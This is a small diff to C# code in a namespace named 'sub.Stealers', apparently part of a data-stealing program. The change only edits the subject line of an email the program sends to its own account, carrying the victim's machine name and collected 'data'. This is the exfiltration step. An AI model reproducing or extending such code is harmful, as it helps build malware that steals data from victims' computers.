@@ -39,7 +39,7 @@ namespace sub.Stealers
             };
             using (MailMessage message = new MailMessage(_username, _username)
             {
-                Subject = Environment.MachineName + " " + _description,
+                Subject = Environment.MachineName + " - " + _description,
                 Body = data
             })
             {
